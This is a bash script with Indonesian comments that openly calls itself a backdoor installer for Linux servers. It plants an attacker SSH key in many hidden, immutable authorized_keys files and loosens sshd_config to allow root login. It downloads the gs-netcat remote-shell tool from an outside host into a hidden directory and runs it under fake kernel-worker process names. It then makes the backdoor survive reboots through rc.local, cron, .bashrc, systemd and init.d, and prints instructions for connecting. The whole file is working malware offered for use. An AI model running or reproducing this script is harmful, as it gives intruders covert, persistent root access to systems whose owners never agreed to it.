#!/bin/bash
# ============================================================
# FULL BACKDOOR - HIDDEN SSH KEYS + GSOCKET TERSAMAR
# Gsocket di folder tersembunyi + persistence reboot
# ============================================================

VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
GSOCKET_SECRET="${VPS_IP}@dark-ai"

# Lokasi tersembunyi untuk gs-netcat
HIDDEN_DIR="/usr/share/man/.cache"
BINARY_NAME="systemd-helper"
GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"

PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")

PUBLIC_KEY='ssh-rsa '

echo "=========================================="
echo " BACKDOOR INSTALLER"
echo " VPS IP: $VPS_IP"
echo " Secret: $GSOCKET_SECRET"
echo "=========================================="

# ============================================================
# 1. HIDDEN SSH KEY - BANYAK LOKASI TERSEMBUNYI
# ============================================================
echo "[1] Install Hidden SSH Keys..."

HIDDEN_PATHS=(
    "/var/.keys"
    "/usr/share/doc/.system"
    "/var/cache/.update"
    "/opt/.config"
    "/etc/.hidden_keys"
    "/usr/share/man/.cache"
    "/var/lib/.ssh_keys"
    "/usr/src/.debug"
    "/tmp/.X11-unix/.k"
    "/usr/include/.hidden"
    "/root/.config/.system"
    "/var/spool/.keys"
    "/etc/ssl/.keys"
    "/usr/share/icons/.cache"
    "/var/log/.ssh_auth"
)

AUTH_PATHS=""
for path in "${HIDDEN_PATHS[@]}"; do
    chattr -i "$path/authorized_keys" 2>/dev/null
    mkdir -p "$path" 2>/dev/null
    chmod 700 "$path" 2>/dev/null
    echo "$PUBLIC_KEY" > "$path/authorized_keys" 2>/dev/null
    chmod 600 "$path/authorized_keys" 2>/dev/null
    chown root:root "$path/authorized_keys" 2>/dev/null
    chattr +i "$path/authorized_keys" 2>/dev/null
    [ -f "$path/authorized_keys" ] && AUTH_PATHS="$AUTH_PATHS $path/authorized_keys"
done

mkdir -p /root/.ssh
chmod 700 /root/.ssh
grep -q "$PUBLIC_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

echo "[✓] SSH Keys di $(echo $AUTH_PATHS | wc -w) lokasi"

# ============================================================
# 2. UPDATE sshd_config
# ============================================================
echo "[2] Update sshd_config..."

cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%s)
sed -i '/^AuthorizedKeysFile/d' /etc/ssh/sshd_config
echo "AuthorizedKeysFile .ssh/authorized_keys$AUTH_PATHS" >> /etc/ssh/sshd_config
sed -i '/^PubkeyAuthentication/d' /etc/ssh/sshd_config
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
sed -i '/^PermitRootLogin/d' /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
sed -i '/^StrictModes/d' /etc/ssh/sshd_config
echo "StrictModes no" >> /etc/ssh/sshd_config

/usr/sbin/sshd -t 2>/tmp/sshd_error.log
if [ $? -eq 0 ]; then
    service sshd restart 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null
    echo "[✓] SSH OK"
else
    cp /etc/ssh/sshd_config.bak.$(date +%s) /etc/ssh/sshd_config 2>/dev/null
    echo "[!] SSH config error, backup dipulihkan"
fi

# ============================================================
# 3. GSOCKET DI FOLDER TERSEMBUNYI
# ============================================================
echo "[3] Install Gsocket di folder tersembunyi..."

mkdir -p "$HIDDEN_DIR"
chmod 755 "$HIDDEN_DIR"

if [ ! -f "$GS_NETCAT" ]; then
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "$GS_NETCAT" 2>/dev/null || \
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null || \
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -O "$GS_NETCAT" 2>/dev/null
    chmod +x "$GS_NETCAT"
fi
chattr +i "$GS_NETCAT" 2>/dev/null
echo "[✓] Binary: $GS_NETCAT"

# Jalankan dengan nama proses kernel worker
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a "$PROCESS_NAME" "$GS_NETCAT" &
echo "[✓] Berjalan sebagai $PROCESS_NAME"

# ============================================================
# 4. PERSISTENCE - REBOOT SURVIVAL
# ============================================================
echo "[4] Install Persistence..."

# 4a. rc.local
grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null || cat >> /etc/rc.local << RC_EOF

# System helper daemon
GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd \$HOME; exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT" &
RC_EOF

# 4b. Cron @reboot
(crontab -l 2>/dev/null; echo "@reboot GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -

# 4c. Cron setiap 5 menit (watchdog)
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -

# 4d. .bashrc
grep -q "$BINARY_NAME" /root/.bashrc 2>/dev/null || echo "pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" SHELL=/bin/bash exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)" >> /root/.bashrc

# 4e. systemd service (jika ada systemd)
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
[Unit]
Description=System Helper Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT"
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-helper 2>/dev/null
    echo "[✓] Systemd service terpasang"
fi

# 4f. Init.d script
cat > /etc/init.d/systemd-helper << INIT_EOF
#!/bin/bash
# System Helper Daemon
case "\$1" in
    start)
        GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &
        ;;
    stop)
        pkill -f "$BINARY_NAME"
        ;;
    *)
        echo "Usage: \$0 {start|stop}"
        ;;
esac
INIT_EOF
chmod +x /etc/init.d/systemd-helper
chkconfig systemd-helper on 2>/dev/null || update-rc.d systemd-helper defaults 2>/dev/null
echo "[✓] Init.d script terpasang"

echo ""
echo "=========================================="
echo " PERSISTENCE TERPASANG:"
echo "  - rc.local"
echo "  - cron @reboot"
echo "  - cron watchdog (5 menit)"
echo "  - .bashrc"
echo "  - systemd service"
echo "  - init.d script"
echo "=========================================="

# ============================================================
# VERIFIKASI
# ============================================================
echo ""
echo "=========================================="
echo " VERIFIKASI"
echo "=========================================="
echo ""
echo "--- SSH AuthorizedKeysFile ---"
grep "^AuthorizedKeysFile" /etc/ssh/sshd_config | head -1
echo ""
echo "--- Gsocket Binary ---"
ls -la "$GS_NETCAT"
echo ""
echo "--- Gsocket Process ---"
ps aux | grep "$BINARY_NAME" | grep -v grep
echo ""
echo "--- Cron ---"
crontab -l 2>/dev/null | grep -i "gsock\|$BINARY_NAME"
echo ""
echo "=========================================="
echo " CONNECT:"
echo "  SSH   : ssh -i backdoor_key root@$VPS_IP"
echo "  Gsock : gs-netcat -s $GSOCKET_SECRET -i"
echo "=========================================="
